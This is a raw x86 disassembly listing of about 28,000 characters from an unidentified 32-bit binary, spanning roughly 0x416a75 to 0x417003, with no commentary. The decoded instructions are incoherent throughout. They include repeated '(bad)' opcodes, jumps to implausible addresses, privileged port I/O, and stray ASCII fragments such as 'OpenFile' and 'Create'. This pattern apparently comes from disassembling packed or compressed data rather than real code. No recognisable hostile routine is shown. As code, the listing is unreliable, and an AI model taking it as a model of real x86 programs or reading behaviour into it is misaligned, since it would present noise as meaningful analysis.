  416a75:	b2 c8                	mov    $0xc8,%dl
  416a77:	f2 8c 01             	repnz mov %es,(%ecx)
  416a7a:	75 06                	jne    0x416a82
  416a7c:	66 8c 52 9b          	data16 mov %ss,-0x65(%edx)
  416a80:	be 54 48 d2 1a       	mov    $0x1ad24854,%esi
  416a85:	6a 06                	push   $0x6
  416a87:	5c                   	pop    %esp
  416a88:	01 aa 9e ad 6d 30    	add    %ebp,0x306dad9e(%edx)
  416a8e:	8e 6c 6c 86          	mov    -0x7a(%esp,%ebp,2),%gs
  416a92:	af                   	scas   %es:(%edi),%eax
  416a93:	85 a8 2d 08 4c 1c    	test   %ebp,0x1c4c082d(%eax)
  416a99:	36 0a 55 5c          	or     %ss:0x5c(%ebp),%dl
  416a9d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416a9e:	25 f4 a0 8e ff       	and    $0xff8ea0f4,%eax
  416aa3:	2d 02 3d 06 75       	sub    $0x75063d02,%eax
  416aa8:	22 66 f7             	and    -0x9(%esi),%ah
  416aab:	46                   	inc    %esi
  416aac:	06                   	push   %es
  416aad:	9e                   	sahf
  416aae:	11 70 a4             	adc    %esi,-0x5c(%eax)
  416ab1:	e0 8e                	loopne 0x416a41
  416ab3:	7e 09                	jle    0x416abe
  416ab5:	81 7e c3 03 40 70 b7 	cmpl   $0xb7704003,-0x3d(%esi)
  416abc:	54                   	push   %esp
  416abd:	a8 69                	test   $0x69,%al
  416abf:	04 ec                	add    $0xec,%al
  416ac1:	e9 45 a0 db 2e       	jmp    0x2f1d0b0b
  416ac6:	ea 4d bd 2c b2 3f 69 	ljmp   $0x693f,$0xb22cbd4d
  416acd:	c0 10 8f             	rclb   $0x8f,(%eax)
  416ad0:	c1 f8 10             	sar    $0x10,%eax
  416ad3:	40                   	inc    %eax
  416ad4:	86 7a 8b             	xchg   %bh,-0x75(%edx)
  416ad7:	61                   	popa
  416ad8:	2d e9 df f8 d9       	sub    $0xd9f8dfe9,%eax
  416add:	e1 57                	loope  0x416b36
  416adf:	b5 85                	mov    $0x85,%ch
  416ae1:	77 fd                	ja     0x416ae0
  416ae3:	c0 d9 fc             	rcr    $0xfc,%cl
  416ae6:	db 2d d0 a6 d8 d9    	fldt   0xd9d8a6d0
  416aec:	9b dd 82 9b 53 05 b1 	fldl   -0x4efaac65(%edx)
  416af3:	5e                   	pop    %esi
  416af4:	aa                   	stos   %al,%es:(%edi)
  416af5:	f9                   	stc
  416af6:	b0 74                	mov    $0x74,%al
  416af8:	09 da                	or     %ebx,%edx
  416afa:	bb da be fb 6f       	mov    $0x6ffbbeda,%ebx
  416aff:	a9 df 75 e6 8d       	test   $0x8de675df,%eax
  416b04:	7b 03                	jnp    0x416b09
  416b06:	ba 09 34 9b 8a       	mov    $0x8a9b3409,%edx
  416b0b:	44                   	inc    %esp
  416b0c:	15 e5 dc c0 f6       	adc    $0xf6c0dce5,%eax
  416b11:	5b                   	pop    %ebx
  416b12:	ed                   	in     (%dx),%eax
  416b13:	5f                   	pop    %edi
  416b14:	f8                   	clc
  416b15:	80 e4 0f             	and    $0xf,%ah
  416b18:	66 05 30 30          	add    $0x3030,%ax
  416b1c:	e1 61                	loope  0x416b7f
  416b1e:	eb 32                	jmp    0x416b52
  416b20:	c0 aa 8b e4 1c bc 01 	shrb   $0x1,-0x43e31b75(%edx)
  416b27:	f8                   	clc
  416b28:	03 7d 08             	add    0x8(%ebp),%edi
  416b2b:	79 18                	jns    0x416b45
  416b2d:	82 3b 7d             	cmpb   $0x7d,(%ebx)
  416b30:	0c 3b                	or     $0x3b,%al
  416b32:	f7 db                	neg    %ebx
  416b34:	ff                   	lcall  (bad)
  416b35:	df 04 83             	filds  (%ebx,%eax,4)
  416b38:	ff 12                	call   *(%edx)
  416b3a:	73 27                	jae    0x416b63
  416b3c:	80 7c 3b 03 35       	cmpb   $0x35,0x3(%ebx,%edi,1)
  416b41:	72 25                	jb     0x416b68
  416b43:	c6 44 06 00 4f       	movb   $0x4f,0x0(%esi,%eax,1)
  416b48:	78 0d                	js     0x416b57
  416b4a:	fe 07                	incb   (%edi)
  416b4c:	1b 6f fb             	sbb    -0x5(%edi),%ebp
  416b4f:	3f                   	aas
  416b50:	12 39                	adc    (%ecx),%bh
  416b52:	77 ed                	ja     0x416b41
  416b54:	eb 1f                	jmp    0x416b75
  416b56:	66 c7                	data16 (bad)
  416b58:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416b59:	31 61 5e             	xor    %esp,0x5e(%ecx)
  416b5c:	bf b6 f0 06 7b       	mov    $0x7b06f0b6,%edi
  416b61:	92                   	xchg   %eax,%edx
  416b62:	24 19                	and    $0x19,%al
  416b64:	20 a0 f1 f0 c7 df    	and    %ah,-0x20380f0f(%eax)
  416b6a:	de ca                	fmulp  %st,%st(2)
  416b6c:	56                   	push   %esi
  416b6d:	1c 66                	sbb    $0x66,%al
  416b6f:	c1 ea 6a             	shr    $0x6a,%edx
  416b72:	89 03                	mov    %eax,(%ebx)
  416b74:	88 53 02             	mov    %dl,0x2(%ebx)
  416b77:	c3                   	ret
  416b78:	41                   	inc    %ecx
  416b79:	ee                   	out    %al,(%dx)
  416b7a:	37                   	aaa
  416b7b:	01 70 ee             	add    %esi,-0x12(%eax)
  416b7e:	8b 06                	mov    (%esi),%eax
  416b80:	77 c8                	ja     0x416b4a
  416b82:	0b ca                	or     %edx,%ecx
  416b84:	0f 84 b4 33 02 26    	je     0x26439f3e
  416b8a:	1b 00                	sbb    (%eax),%eax
  416b8c:	d6                   	salc
  416b8d:	07                   	pop    %es
  416b8e:	f8                   	clc
  416b8f:	ad                   	lods   %ds:(%esi),%eax
  416b90:	e3 d6                	jecxz  0x416b68
  416b92:	b0 82                	mov    $0x82,%al
  416b94:	0b ff                	or     %edi,%edi
  416b96:	78 ff                	js     0x416b97
  416b98:	7a 04                	jp     0x416b9e
  416b9a:	7c 1f                	jl     0x416bbb
  416b9c:	bf 04 63 ff 37       	mov    $0x37ff6304,%edi
  416ba1:	9b                   	fwait
  416ba2:	21 41 2d             	and    %eax,0x2d(%ecx)
  416ba5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416ba6:	81 da b3 b6 e0 0d    	sbb    $0xde0b6b3,%edx
  416bac:	73 f2                	jae    0x416ba0
  416bae:	49                   	dec    %ecx
  416baf:	05 0d d2 54 7d       	add    $0x7d54d20d,%eax
  416bb4:	d9 38                	fnstcw (%eax)
  416bb6:	77 f0                	ja     0x416ba8
  416bb8:	f4                   	hlt
  416bb9:	df 6d f0             	fildll -0x10(%ebp)
  416bbc:	e6 be                	out    %al,$0xbe
  416bbe:	f0 2b 20             	lock sub (%eax),%esp
  416bc1:	29 2b                	sub    %ebp,(%ebx)
  416bc3:	c2 78 da             	ret    $0xda78
  416bc6:	34 85                	xor    $0x85,%al
  416bc8:	bc f4 f1 db bb       	mov    $0xbbdbf1f4,%esp
  416bcd:	01 70 9b             	add    %esi,-0x65(%eax)
  416bd0:	94                   	xchg   %eax,%esp
  416bd1:	1b b9 f6 f5 0d fc    	sbb    -0x3f20a0a(%ecx),%edi
  416bd7:	7f 81                	jg     0x416b5a
  416bd9:	27                   	daa
  416bda:	75 1e                	jne    0x416bfa
  416bdc:	da 24 0f             	fisubl (%edi,%ecx,1)
  416bdf:	75 1f                	jne    0x416c00
  416be1:	49                   	dec    %ecx
  416be2:	75 ec                	jne    0x416bd0
  416be4:	eb 39                	jmp    0x416c1f
  416be6:	8a c1                	mov    %cl,%al
  416be8:	04 f7                	add    $0xf7,%al
  416bea:	dc c2                	fadd   %st,%st(2)
  416bec:	0a 6c 1f 10          	or     0x10(%edi,%ebx,1),%ch
  416bf0:	20 06                	and    %al,(%esi)
  416bf2:	ed                   	in     (%dx),%eax
  416bf3:	d2 37                	shlb   %cl,(%edi)
  416bf5:	36 21 ea             	ss and %ebp,%edx
  416bf8:	43                   	inc    %ebx
  416bf9:	8d 4c 13 03          	lea    0x3(%ebx,%edx,1),%ecx
  416bfd:	15 c6 07 d4 c1       	adc    $0xc1d407c6,%eax
  416c02:	56                   	push   %esi
  416c03:	73 db                	jae    0x416be0
  416c05:	80 3f d0             	cmpb   $0xd0,(%edi)
  416c08:	f7 b8 cb 9a 07 e7    	idivl  -0x18f86535(%eax)
  416c0e:	84 59 db             	test   %bl,-0x25(%ecx)
  416c11:	70 d2                	jo     0x416be5
  416c13:	88 fa                	mov    %bh,%dl
  416c15:	d4 fe                	aam    $0xfe
  416c17:	06                   	push   %es
  416c18:	ae                   	scas   %es:(%edi),%al
  416c19:	dd ff                	(bad)
  416c1b:	af                   	scas   %es:(%edi),%eax
  416c1c:	f0 d0 9b d9 7d fa 9b 	lock rcrb $1,-0x64058227(%ebx)
  416c23:	db e2                	fnclex
  416c25:	d9 2d da 88 d9 ee    	fldcw  0xeed988da
  416c2b:	42                   	inc    %edx
  416c2c:	f7 8d 56 fe 88 2b 8a 	testl  $0xff803e8a,0x2b88fe56(%ebp)
  416c33:	3e 80 ff 
  416c36:	2b 04 c4             	sub    (%esp,%eax,8),%eax
  416c39:	01 46 8b             	add    %eax,-0x75(%esi)
  416c3c:	ce                   	into
  416c3d:	13 96 1e b7 da 36    	adc    0x36dab71e(%esi),%edx
  416c43:	42                   	inc    %edx
  416c44:	19 3a                	sbb    %edi,(%edx)
  416c46:	05 65 2a 46 4a       	add    $0x4a462a65,%eax
  416c4b:	b7 2f                	mov    $0x2f,%bh
  416c4d:	c4 11                	les    (%ecx),%edx
  416c4f:	06                   	push   %es
  416c50:	3b ce                	cmp    %esi,%ecx
  416c52:	74 4a                	je     0x416c9e
  416c54:	15 24 df 1c 1a       	adc    $0x1a1cdf24,%eax
  416c59:	b1 7f                	mov    $0x7f,%cl
  416c5b:	b7 d3                	mov    $0xd3,%bh
  416c5d:	46                   	inc    %esi
  416c5e:	52                   	push   %edx
  416c5f:	14 52                	adc    $0x52,%al
  416c61:	58                   	pop    %eax
  416c62:	03 d0                	add    %eax,%edx
  416c64:	42                   	inc    %edx
  416c65:	f2 4a                	repnz dec %edx
  416c67:	26 1a 08             	sbb    %es:(%eax),%cl
  416c6a:	95                   	xchg   %eax,%ebp
  416c6b:	c2 97 57             	ret    $0x5797
  416c6e:	f8                   	clc
  416c6f:	33 bc a2 4d f8 4f 02 	xor    0x24ff84d(%edx,%eiz,4),%edi
  416c76:	d9 e0                	fchs
  416c78:	36 da ff             	ss (bad)
  416c7b:	1f                   	pop    %ds
  416c7c:	3d 04 df 3f eb       	cmp    $0xeb3fdf04,%eax
  416c81:	02 db                	add    %bl,%bl
  416c83:	3f                   	aas
  416c84:	9b df e0             	fstsw  %ax
  416c87:	66 a9 d1 9d          	test   $0x9dd1,%ax
  416c8b:	b0 b4                	mov    $0xb4,%al
  416c8d:	af                   	scas   %es:(%edi),%eax
  416c8e:	11 97 ff 04 dd 60    	adc    %edx,0x60dd04ff(%edi)
  416c94:	89 6d 8f             	mov    %ebp,-0x71(%ebp)
  416c97:	12 6d ac             	adc    -0x54(%ebp),%ch
  416c9a:	67 84 c3             	addr16 test %al,%bl
  416c9d:	ac                   	lods   %ds:(%esi),%al
  416c9e:	97                   	xchg   %eax,%edi
  416c9f:	20 c9                	and    %cl,%cl
  416ca1:	99                   	cltd
  416ca2:	0d 3c fe bf c3       	or     $0xc3bffe3c,%eax
  416ca7:	ac                   	lods   %ds:(%esi),%al
  416ca8:	2c 3a                	sub    $0x3a,%al
  416caa:	04 0a                	add    $0xa,%al
  416cac:	73 0f                	jae    0x416cbd
  416cae:	da 0d 28 8f da 6b    	fimull 0x6bda8f28
  416cb4:	3c db                	cmp    $0xdb,%al
  416cb6:	6a 02                	push   $0x2
  416cb8:	52                   	push   %edx
  416cb9:	ea 1b 8a 0e c9 b2 b7 	ljmp   $0xb7b2,$0xc90e8a1b
  416cc0:	1f                   	pop    %ds
  416cc1:	6b e7 f9             	imul   $0xfffffff9,%edi,%esp
  416cc4:	93                   	xchg   %eax,%ebx
  416cc5:	29 0e                	sub    %ecx,(%esi)
  416cc7:	46                   	inc    %esi
  416cc8:	6b d2 0a             	imul   $0xa,%edx,%edx
  416ccb:	8f 81 fa a7 da b7    	pop    -0x48255806(%ecx)
  416cd1:	89 f4                	mov    %esi,%esp
  416cd3:	9d                   	popf
  416cd4:	72 ea                	jb     0x416cc0
  416cd6:	1b 02                	sbb    (%edx),%eax
  416cd8:	b4 a7                	mov    $0xa7,%ah
  416cda:	60                   	pusha
  416cdb:	92                   	xchg   %eax,%edx
  416cdc:	67 51                	addr16 push %ecx
  416cde:	73 be                	jae    0x416c9e
  416ce0:	99                   	cltd
  416ce1:	f0 8e 04 bb          	lock mov (%ebx,%edi,4),%es
  416ce5:	37                   	aaa
  416ce6:	da 0f                	fimull (%edi)
  416ce8:	85 0b                	test   %ecx,(%ebx)
  416cea:	29 b8 fc e8 7c dc    	sub    %edi,-0x23831704(%eax)
  416cf0:	d5 86                	aad    $0x86
  416cf2:	de ec                	fsubrp %st,%st(4)
  416cf4:	04 7b                	add    $0x7b,%al
  416cf6:	30 74 78 b8          	xor    %dh,-0x48(%eax,%edi,2)
  416cfa:	f0 05 b9 16 e4 bb    	lock add $0xbbe416b9,%eax
  416d00:	45                   	inc    %ebp
  416d01:	8e d4                	mov    %esp,%ss
  416d03:	0c 7f                	or     $0x7f,%al
  416d05:	6d                   	insl   (%dx),%es:(%edi)
  416d06:	b8 b8 14 07 80       	mov    $0x800714b8,%eax
  416d0b:	02 1c 72             	add    (%edx,%esi,2),%bl
  416d0e:	8c 7e f0             	mov    %?,-0x10(%esi)
  416d11:	5f                   	pop    %edi
  416d12:	87 1c cc             	xchg   %ebx,(%esp,%ecx,8)
  416d15:	7d d7                	jge    0x416cee
  416d17:	b8 b4 47 1e 00       	mov    $0x1e47b4,%eax
  416d1c:	10 8c 73 80 1c 60 14 	adc    %cl,0x14601c80(%ebx,%esi,2)
  416d23:	70 40                	jo     0x416d65
  416d25:	60                   	pusha
  416d26:	80 0c c9 0c          	orb    $0xc,(%ecx,%ecx,8)
  416d2a:	10 24 93             	adc    %ah,(%ebx,%edx,4)
  416d2d:	9d                   	popf
  416d2e:	99                   	cltd
  416d2f:	b3 72                	mov    $0x72,%bl
  416d31:	08 09                	or     %cl,(%ecx)
  416d33:	04 49                	add    $0x49,%al
  416d35:	0e                   	push   %cs
  416d36:	39 c9                	cmp    %ecx,%ecx
  416d38:	00 f8                	add    %bh,%al
  416d3a:	04 f4                	add    $0xf4,%al
  416d3c:	39 73 45             	cmp    %esi,0x45(%ebx)
  416d3f:	92                   	xchg   %eax,%edx
  416d40:	e8 78 09 b8 e4       	call   0xe4f976bd
  416d45:	61                   	popa
  416d46:	01 0c 3f             	add    %ecx,(%edi,%edi,1)
  416d49:	c5 99 76 39 c9 01    	lds    0x1c93976(%ecx),%ebx
  416d4f:	30 9a f0 05 73 40    	xor    %bl,0x407305f0(%edx)
  416d55:	3a d1                	cmp    %cl,%dl
  416d57:	ec                   	in     (%dx),%al
  416d58:	c2 d8 8c             	ret    $0x8cd8
  416d5b:	3b 22                	cmp    (%edx),%esp
  416d5d:	46                   	inc    %esi
  416d5e:	dc 8d 09 23 bc e2    	fmull  -0x1d43dcf7(%ebp)
  416d64:	06                   	push   %es
  416d65:	d5 c9                	aad    $0xc9
  416d67:	04 35                	add    $0x35,%al
  416d69:	1b ba cd 86 43 b8    	sbb    -0x47bc7933(%edx),%edi
  416d6f:	44                   	inc    %esp
  416d70:	35 47 63 73 ac       	xor    $0xac736347,%eax
  416d75:	77 90                	ja     0x416d07
  416d77:	93                   	xchg   %eax,%ebx
  416d78:	ec                   	in     (%dx),%al
  416d79:	9e                   	sahf
  416d7a:	10 e4                	adc    %ah,%ah
  416d7c:	71 7b                	jno    0x416df9
  416d7e:	50                   	push   %eax
  416d7f:	37                   	aaa
  416d80:	9a a3 7a 49 30 f7 30 	lcall  $0x30f7,$0x30497aa3
  416d87:	78 33                	js     0x416dbc
  416d89:	bc e4 24 0f 6d       	mov    $0x6d0f24e4,%esp
  416d8e:	9a 00 06 74 9a c8 60 	lcall  $0x60c8,$0x9a740600
  416d95:	e6 90                	out    %al,$0x90
  416d97:	00 06                	add    %al,(%esi)
  416d99:	37                   	aaa
  416d9a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416d9b:	4c                   	dec    %esp
  416d9c:	c9                   	leave
  416d9d:	81 0c 04 ac 04 ec a4 	orl    $0xa4ec04ac,(%esp,%eax,1)
  416da4:	a3 8a b3 a1 a2       	mov    %eax,0xa2a1b38a
  416da9:	07                   	pop    %es
  416daa:	90                   	nop
  416dab:	41                   	inc    %ecx
  416dac:	06                   	push   %es
  416dad:	19 a3 a4 a5 41 06    	sbb    %esp,0x641a5a4(%ebx)
  416db3:	19 64 a6 a7          	sbb    %esp,-0x59(%esi,%eiz,4)
  416db7:	a8 06                	test   $0x6,%al
  416db9:	19 64 90 a9          	sbb    %esp,-0x57(%eax,%edx,4)
  416dbd:	aa                   	stos   %al,%es:(%edi)
  416dbe:	ab                   	stos   %eax,%es:(%edi)
  416dbf:	ac                   	lods   %ds:(%esi),%al
  416dc0:	19 64 90 41          	sbb    %esp,0x41(%eax,%edx,4)
  416dc4:	ad                   	lods   %ds:(%esi),%eax
  416dc5:	ae                   	scas   %es:(%edi),%al
  416dc6:	af                   	scas   %es:(%edi),%eax
  416dc7:	40                   	inc    %eax
  416dc8:	2e 39 98 af 55 9b 08 	cmp    %ebx,%cs:0x89b55af(%eax)
  416dcf:	21 22                	and    %esp,(%edx)
  416dd1:	47                   	inc    %edi
  416dd2:	f2 5c                	repnz pop %esp
  416dd4:	9b                   	fwait
  416dd5:	08 07                	or     %al,(%edi)
  416dd7:	be 2c e0 07 46       	mov    $0x4607e02c,%esi
  416ddc:	61                   	popa
  416ddd:	6c                   	insb   (%dx),%es:(%edi)
  416dde:	73 65                	jae    0x416e45
  416de0:	bb 54 72 75 26       	mov    $0x26757254,%ebx
  416de5:	7b 08                	jnp    0x416def
  416de7:	61                   	popa
  416de8:	4f                   	dec    %edi
  416de9:	2e 00 63 da          	add    %ah,%cs:-0x26(%ebx)
  416ded:	c6                   	(bad)
  416dee:	5b                   	pop    %ebx
  416def:	66 40                	inc    %ax
  416df1:	0c 74                	or     $0x74,%al
  416df3:	b8 ac f2 10 2d       	mov    $0x2d10f2ac,%eax
  416df8:	64 a3 1d a4 09 75    	mov    %eax,%fs:0x7509a41d
  416dfe:	02 c8                	add    %al,%cl
  416e00:	36 21 93 84 e1 90 83 	and    %edx,%ss:-0x7c6f1e7c(%ebx)
  416e07:	0c c8                	or     $0xc8,%al
  416e09:	89 04 ea             	mov    %eax,(%edx,%ebp,8)
  416e0c:	38 9c f7 38 9c 80 85 	cmp    %bl,-0x7a7f63c8(%edi,%esi,8)
  416e13:	e8 40 53 74 dc       	call   0xdcb5c158
  416e18:	6d                   	insl   (%dx),%es:(%edi)
  416e19:	2f                   	das
  416e1a:	94                   	xchg   %eax,%esp
  416e1b:	75 1c                	jne    0x416e39
  416e1d:	ac                   	lods   %ds:(%esi),%al
  416e1e:	56                   	push   %esi
  416e1f:	94                   	xchg   %eax,%esp
  416e20:	5b                   	pop    %ebx
  416e21:	1f                   	pop    %ds
  416e22:	07                   	pop    %es
  416e23:	40                   	inc    %eax
  416e24:	76 45                	jbe    0x416e6b
  416e26:	2f                   	das
  416e27:	ec                   	in     (%dx),%al
  416e28:	9b                   	fwait
  416e29:	46                   	inc    %esi
  416e2a:	43                   	inc    %ebx
  416e2b:	64 28 3b             	sub    %bh,%fs:(%ebx)
  416e2e:	f9                   	stc
  416e2f:	72 65                	jb     0x416e96
  416e31:	61                   	popa
  416e32:	74 65                	je     0x416e99
  416e34:	f0 5b                	lock pop %ebx
  416e36:	f0 3b f6             	lock cmp %esi,%esi
  416e39:	65 20 0b             	and    %cl,%gs:(%ebx)
  416e3c:	4f                   	dec    %edi
  416e3d:	70 65                	jo     0x416ea4
  416e3f:	6e                   	outsb  %ds:(%esi),(%dx)
  416e40:	59                   	pop    %ecx
  416e41:	48                   	dec    %eax
  416e42:	9d                   	popf
  416e43:	57                   	push   %edi
  416e44:	3e 11 f2             	ds adc %esi,%edx
  416e47:	22 48 9d             	and    -0x63(%eax),%cl
  416e4a:	69 6c 65 72 07 19 4a 	imul   $0x464a1907,0x72(%ebp,%eiz,2),%ebp
  416e51:	46 
  416e52:	a0 a0 fc 9c 88       	mov    0x889cfca0,%al
  416e57:	02 60 50             	add    0x50(%eax),%ah
  416e5a:	47                   	inc    %edi
  416e5b:	43                   	inc    %ebx
  416e5c:	d9 57 f4             	fsts   -0xc(%edi)
  416e5f:	c8 1f f8 57          	enter  $0xf81f,$0x57
  416e63:	f8                   	clc
  416e64:	53                   	push   %ebx
  416e65:	d4 02                	aam    $0x2
  416e67:	21 af 13 e4 45 c6    	and    %ebp,-0x39ba1bed(%edi)
  416e6d:	b1 58                	mov    $0x58,%cl
  416e6f:	50                   	push   %eax
  416e70:	9e                   	sahf
  416e71:	17                   	pop    %ss
  416e72:	50                   	push   %eax
  416e73:	9e                   	sahf
  416e74:	b0 a2                	mov    $0xa2,%al
  416e76:	db 0a                	fisttpl (%edx)
  416e78:	af                   	scas   %es:(%edi),%eax
  416e79:	4c                   	dec    %esp
  416e7a:	69 cf 81 7a a1 6c    	imul   $0x6ca17a81,%edi,%ecx
  416e80:	a8 57                	test   $0x57,%al
  416e82:	1f                   	pop    %ds
  416e83:	e7 62                	out    %eax,$0x62
  416e85:	40                   	inc    %eax
  416e86:	90                   	nop
  416e87:	02 a3 2e 92 1d c9    	add    -0x36e26dd2(%ebx),%ah
  416e8d:	5d                   	pop    %ebp
  416e8e:	73 08                	jae    0x416e98
  416e90:	9f                   	lahf
  416e91:	18 f6                	sbb    %dh,%dh
  416e93:	2a 2b                	sub    (%ebx),%ch
  416e95:	ea 1f 10 47 6c a4 0b 	ljmp   $0xba4,$0x6c47101f
  416e9c:	db 34 cb             	(bad) (%ebx,%ecx,8)
  416e9f:	e5 bc                	in     $0xbc,%eax
  416ea1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416ea2:	9c                   	pushf
  416ea3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416ea4:	8c 08                	mov    %cs,(%eax)
  416ea6:	05 54 69 34 43       	add    $0x43346954,%eax
  416eab:	d9 c6                	fld    %st(6)
  416ead:	7b 6c                	jnp    0x416f1b
  416eaf:	63 6c 24 81          	arpl   %ebp,-0x7f(%esp)
  416eb3:	da 0d 80 f4 5b 0b    	fimull 0xb5bf480
  416eb9:	54                   	push   %esp
  416eba:	10 80 0d d9 17 59    	adc    %al,0x5917d90d(%eax)
  416ec0:	c4 57 f0             	les    -0x10(%edi),%edx
  416ec3:	0f 0e                	femms
  416ec5:	80 74 dd d0 0b       	xorb   $0xb,-0x30(%ebp,%ebx,8)
  416eca:	de 57 04             	ficoms 0x4(%edi)
  416ecd:	90                   	nop
  416ece:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416ecf:	5d                   	pop    %ebp
  416ed0:	5d                   	pop    %ebp
  416ed1:	b3 dc                	mov    $0xdc,%bl
  416ed3:	03 a0 a8 a8 bc 0b    	add    0xbbca8a8(%eax),%esp
  416ed9:	02 49 fe             	add    -0x2(%ecx),%cl
  416edc:	70 1b                	jo     0x416ef9
  416ede:	cf                   	iret
  416edf:	ed                   	in     (%dx),%eax
  416ee0:	ff 5c a9 71          	lcall  *0x71(%ecx,%ebp,4)
  416ee4:	ac                   	lods   %ds:(%esi),%al
  416ee5:	a8 50                	test   $0x50,%al
  416ee7:	93                   	xchg   %eax,%ebx
  416ee8:	73 6e                	jae    0x416f58
  416eea:	df c0                	ffreep %st(0)
  416eec:	3e d7                	xlat   %ds:(%ebx)
  416eee:	f1                   	int1
  416eef:	cb                   	lret
  416ef0:	63 07                	arpl   %eax,(%edi)
  416ef2:	12 84 60 0d 65 eb bf 	adc    -0x40149af3(%eax,%eiz,2),%al
  416ef9:	10 78 07             	adc    %bh,0x7(%eax)
  416efc:	43                   	inc    %ebx
  416efd:	6c                   	insb   (%dx),%es:(%edi)
  416efe:	61                   	popa
  416eff:	73 98                	jae    0x416e99
  416f01:	73 57                	jae    0x416f5a
  416f03:	18 fd                	sbb    %bh,%ch
  416f05:	09 37                	or     %esi,(%edi)
  416f07:	aa                   	stos   %al,%es:(%edi)
  416f08:	a0 33 0f 49 70       	mov    0x70490f33,%al
  416f0d:	73 41                	jae    0x416f50
  416f0f:	64 61                	fs popa
  416f11:	70 ff                	jo     0x416f12
  416f13:	7f b7                	jg     0x416ecc
  416f15:	51                   	push   %ecx
  416f16:	34 80                	xor    $0x80,%al
  416f18:	27                   	daa
  416f19:	01 34 2f             	add    %esi,(%edi,%ebp,1)
  416f1c:	9c                   	pushf
  416f1d:	73 ec                	jae    0x416f0b
  416f1f:	52                   	push   %edx
  416f20:	d0 11                	rclb   $1,(%ecx)
  416f22:	9e                   	sahf
  416f23:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416f24:	00 20                	add    %ah,(%eax)
  416f26:	af                   	scas   %es:(%edi),%eax
  416f27:	3d 3c 04 77 d9       	cmp    $0xd977043c,%eax
  416f2c:	82 da 36             	sbb    $0x36,%dl
  416f2f:	94                   	xchg   %eax,%esp
  416f30:	33 13                	xor    (%ebx),%edx
  416f32:	04 a1                	add    $0xa1,%al
  416f34:	4f                   	dec    %edi
  416f35:	1e                   	push   %ds
  416f36:	08 ce                	or     %cl,%dh
  416f38:	03 eb                	add    %ebx,%ebp
  416f3a:	16                   	push   %ss
  416f3b:	a1 78 9f 75 4f       	mov    0x4f759f78,%eax
  416f40:	5e                   	pop    %esi
  416f41:	64 cf                	fs iret
  416f43:	60                   	pusha
  416f44:	a9 70 ab db aa       	test   $0xaadbab70,%eax
  416f49:	6d                   	insl   (%dx),%es:(%edi)
  416f4a:	73 72                	jae    0x416fbe
  416f4c:	b9 07 fc 27 f4       	mov    $0xf427fc07,%ecx
  416f51:	ad                   	lods   %ds:(%esi),%eax
  416f52:	fc                   	cld
  416f53:	54                   	push   %esp
  416f54:	ae                   	scas   %es:(%edi),%al
  416f55:	03 6e e7             	add    -0x19(%esi),%ebp
  416f58:	36 cb                	ss lret
  416f5a:	9c                   	pushf
  416f5b:	b1 cc                	mov    $0xcc,%cl
  416f5d:	34 b3                	xor    $0xb3,%al
  416f5f:	f3 03 7c b4 2b       	repz add 0x2b(%esp,%esi,4),%edi
  416f64:	cd 37                	int    $0x37
  416f66:	db 75 37             	(bad) 0x37(%ebp)
  416f69:	b4 03                	mov    $0x3,%ah
  416f6b:	d8 a9 2b 2f 0c 00    	fsubrs 0xc2f2b(%ecx)
  416f71:	ce                   	into
  416f72:	ec                   	in     (%dx),%al
  416f73:	ce                   	into
  416f74:	36 3c af             	ss cmp $0xaf,%al
  416f77:	0f ec 07             	paddsb (%edi),%mm0
  416f7a:	40                   	inc    %eax
  416f7b:	b0 03                	mov    $0x3,%al
  416f7d:	80 41 ed dc          	addb   $0xdc,-0x13(%ecx)
  416f81:	80 b2 2b 03 6c b3 43 	xorb   $0x43,-0x4c93fcd5(%edx)
  416f88:	be c1 36 dd 14       	mov    $0x14dd36c1,%esi
  416f8d:	c5 08                	lds    (%eax),%ecx
  416f8f:	08 54 fc 90          	or     %dl,-0x70(%esp,%edi,8)
  416f93:	c7 07 b0 10 7e c9    	movl   $0xc97e10b0,(%edi)
  416f99:	0e                   	push   %cs
  416f9a:	e5 ec                	in     $0xec,%eax
  416f9c:	9f                   	lahf
  416f9d:	30 58 18             	xor    %bl,0x18(%eax)
  416fa0:	64 b7 57             	fs mov $0x57,%bh
  416fa3:	48                   	dec    %eax
  416fa4:	23 0e                	and    (%esi),%ecx
  416fa6:	0b 49 2b             	or     0x2b(%ecx),%ecx
  416fa9:	6d                   	insl   (%dx),%es:(%edi)
  416faa:	c1 7d 01 23          	sarl   $0x23,0x1(%ebp)
  416fae:	38 00                	cmp    %al,(%eax)
  416fb0:	8d 9b 0f d7 5c d8    	lea    -0x27a328f1(%ebx),%ebx
  416fb6:	21 48 a2             	and    %ecx,-0x5e(%eax)
  416fb9:	0f 38 30             	(bad)
  416fbc:	17                   	pop    %ss
  416fbd:	2f                   	das
  416fbe:	e4 45                	in     $0x45,%al
  416fc0:	c2 a0 1f             	ret    $0x1fa0
  416fc3:	04 b5                	add    $0xb5,%al
  416fc5:	70 b7                	jo     0x416f7e
  416fc7:	79 c2                	jns    0x416f8b
  416fc9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416fca:	73 1b                	jae    0x416fe7
  416fcc:	03 a8 ac b7 1f f0    	add    -0xfe04854(%eax),%ebp
  416fd2:	b8 e4 f2 e4 72       	mov    $0x72e4f2e4,%eax
  416fd7:	48                   	dec    %eax
  416fd8:	b9 18 ba 34 ba       	mov    $0xba34ba18,%ecx
  416fdd:	60                   	pusha
  416fde:	b5 79                	mov    $0x79,%ch
  416fe0:	72 b9                	jb     0x416f9b
  416fe2:	bc f0 b5 28 b6       	mov    $0xb628b5f0,%esp
  416fe7:	8c b6 08 b8 75 dd    	mov    %?,-0x228a47f8(%esi)
  416fed:	15 72 40 b8 b8       	adc    $0xb8b84072,%eax
  416ff2:	2f                   	das
  416ff3:	d4 03                	aam    $0x3
  416ff5:	08 5b d2             	or     %bl,-0x2e(%ebx)
  416ff8:	63 d7                	arpl   %edx,%edi
  416ffa:	5f                   	pop    %edi
  416ffb:	5c                   	pop    %esp
  416ffc:	4b                   	dec    %ebx
  416ffd:	6c                   	insb   (%dx),%es:(%edi)
  416ffe:	ba 59 8f cb ca       	mov    $0xcacb8f59,%edx
  417003:	f8                   	clc
